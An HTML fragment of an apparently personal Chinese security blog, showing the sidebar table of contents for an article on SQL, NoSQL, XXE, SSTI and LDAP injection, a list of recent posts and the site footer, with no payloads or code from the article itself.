class="author-info-description">57qv6I+c54uX572i5LqG</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lan1oc"><i class="fab fa-github"></i><span>没啥用的仓库</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">随便写写</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E9%98%B6-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">高阶 SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">实践</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E6%89%80%E6%9C%89%E4%B9%A6%E7%B1%8D%E7%9A%84%E6%A0%87%E9%A2%98%E6%9B%B4%E6%96%B0%E4%B8%BA-%E2%80%9Ccompromised%E2%80%9D"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">将所有书籍的标题更新为 “compromised”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E8%A1%A8-hello"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">删除表 hello</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">1.2.</span> <span class="toc-text">bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">字符编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-1"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">实践</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%BC%95%E5%8F%B7-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">无引号 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">1.2.3.</span> <span class="toc-text">空格被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8%E4%BA%8E%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%E7%AD%9B%E9%80%89%E5%99%A8%E5%92%8C-WAF-%E7%9A%84%E5%90%84%E7%A7%8D%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.4.</span> <span class="toc-text">可用于尝试绕过筛选器和 WAF 的各种技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96-SQL-%E6%B3%A8%E5%85%A5%EF%BC%88OOB-sql%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">带外 SQL 注入（OOB sql注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%B8%8E%E7%94%A8%E9%80%94"><span class="toc-number">1.3.1.</span> <span class="toc-text">原理与用途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%8A%80%E6%9C%AF"><span class="toc-number">1.3.2.</span> <span class="toc-text">不同数据库中的技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-%E5%92%8C-MariaDB"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">MySQL 和 MariaDB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Microsoft-SQL-Server-%EF%BC%88MSSQL%EF%BC%89"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">Microsoft SQL Server （MSSQL）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">Oracle</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-smb%E5%B8%A6%E5%A4%96"><span class="toc-number">1.3.3.</span> <span class="toc-text">实践(smb带外)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5%E4%BD%8D"><span class="toc-number">1.4.</span> <span class="toc-text">其他注入位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E5%8D%8F%E8%AE%AE%E6%A0%87%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">HTTP 协议标头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%EF%BC%88UA%E5%A4%B4%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">实践（UA头注入）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-%E5%92%8C-JSON-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">XML 和 JSON 注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NOSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">NOSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mongo-DB"><span class="toc-number">2.0.1.</span> <span class="toc-text">Mongo DB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">运算符注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95%E9%A1%B5"><span class="toc-number">2.1.1.</span> <span class="toc-text">绕过登录页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">切换用户登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.3.</span> <span class="toc-text">拿密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">语法注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">ssh身份验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">XXE 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">3.1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML-%E5%AE%9E%E4%BD%93"><span class="toc-number">3.1.1.</span> <span class="toc-text">XML 实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%86%85"><span class="toc-number">3.2.1.</span> <span class="toc-text">带内</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96"><span class="toc-number">3.2.2.</span> <span class="toc-text">带外</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-XXE"><span class="toc-number">3.2.3.</span> <span class="toc-text">SSRF + XXE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">SSTI(服务器端模板注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI-%E6%94%BB%E5%87%BB%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">4.0.1.</span> <span class="toc-text">SSTI 攻击的流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">4.1.</span> <span class="toc-text">确定模板引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jinja2%EF%BC%88python%EF%BC%89"><span class="toc-number">4.1.1.</span> <span class="toc-text">Jinja2（python）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Twig%EF%BC%88PHP%EF%BC%89"><span class="toc-number">4.1.2.</span> <span class="toc-text">Twig（PHP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jade-Pug%EF%BC%88Node-js%EF%BC%89"><span class="toc-number">4.1.3.</span> <span class="toc-text">Jade&#x2F;Pug（Node.js）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">4.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">4.2.1.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Smarty"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#twig"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">twig</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS-Pug"><span class="toc-number">4.2.2.</span> <span class="toc-text">NodeJS - Pug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">4.2.3.</span> <span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Jinja2"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">Jinja2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mako%EF%BC%88sstimap%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="toc-number">4.2.3.2.</span> <span class="toc-text">mako（sstimap使用）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%AF%E5%AE%9E%E8%B7%B5"><span class="toc-number">4.3.</span> <span class="toc-text">纯实践</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E7%9E%8E"><span class="toc-number">4.3.1.</span> <span class="toc-text">抓瞎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0ssti"><span class="toc-number">4.3.2.</span> <span class="toc-text">找到ssti</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LDAP%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">LDAP注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-number">5.1.</span> <span class="toc-text">结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%92%8C%E8%AF%AD%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">过滤器和语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E6%9C%89%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6%E7%9A%84%E5%A4%8D%E6%9D%82%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%9A"><span class="toc-number">5.2.1.</span> <span class="toc-text">带有逻辑运算符的复杂过滤器：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">5.3.</span> <span class="toc-text">注入基础知识</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/13/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/shiro%E6%9C%89key%E6%97%A0%E9%93%BE/" title="[记录]shiro有key无链利用方式，但失败"><img src="/img/c1/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[记录]shiro有key无链利用方式，但失败"/></a><div class="content"><a class="title" href="/2026/01/13/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/shiro%E6%9C%89key%E6%97%A0%E9%93%BE/" title="[记录]shiro有key无链利用方式，但失败">[记录]shiro有key无链利用方式，但失败</a><time datetime="2026-01-12T16:00:00.000Z" title="发表于 2026-01-13 00:00:00">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/" title="挖矿病毒事件的后门分析"><img src="/img/c1/1.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="挖矿病毒事件的后门分析"/></a><div class="content"><a class="title" href="/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/" title="挖矿病毒事件的后门分析">挖矿病毒事件的后门分析</a><time datetime="2025-12-29T16:00:00.000Z" title="发表于 2025-12-30 00:00:00">2025-12-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B010%E2%80%94%E2%80%94ida_pro%20mcp%E7%9A%84%E5%AE%89%E8%A3%85/" title="笔记10——ida_pro mcp的安装"><img src="/img/cover/1.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="笔记10——ida_pro mcp的安装"/></a><div class="content"><a class="title" href="/2025/12/29/%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B010%E2%80%94%E2%80%94ida_pro%20mcp%E7%9A%84%E5%AE%89%E8%A3%85/" title="笔记10——ida_pro mcp的安装">笔记10——ida_pro mcp的安装</a><time datetime="2025-12-28T16:00:00.000Z" title="发表于 2025-12-29 00:00:00">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/20/%E5%B7%A5%E4%BD%9C/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/" title="实战——挖矿病毒应急排查(docker镜像取证与分析)"><img src="/img/cover/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实战——挖矿病毒应急排查(docker镜像取证与分析)"/></a><div class="content"><a class="title" href="/2025/12/20/%E5%B7%A5%E4%BD%9C/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/" title="实战——挖矿病毒应急排查(docker镜像取证与分析)">实战——挖矿病毒应急排查(docker镜像取证与分析)</a><time datetime="2025-12-19T16:00:00.000Z" title="发表于 2025-12-20 00:00:00">2025-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/12/%E8%AE%B0%E5%BD%95/%E6%80%BB%E7%BB%93/%E5%8E%BB%E4%BB%96%E5%A6%88%E7%9A%842025/" title="去他妈的2025"><img src="/img/cover/3.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="去他妈的2025"/></a><div class="content"><a class="title" href="/2025/12/12/%E8%AE%B0%E5%BD%95/%E6%80%BB%E7%BB%93/%E5%8E%BB%E4%BB%96%E5%A6%88%E7%9A%842025/" title="去他妈的2025">去他妈的2025</a><time datetime="2025-12-11T16:00:00.000Z" title="发表于 2025-12-12 00:00:00">2025-12-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/5.webp);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By lan1oc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>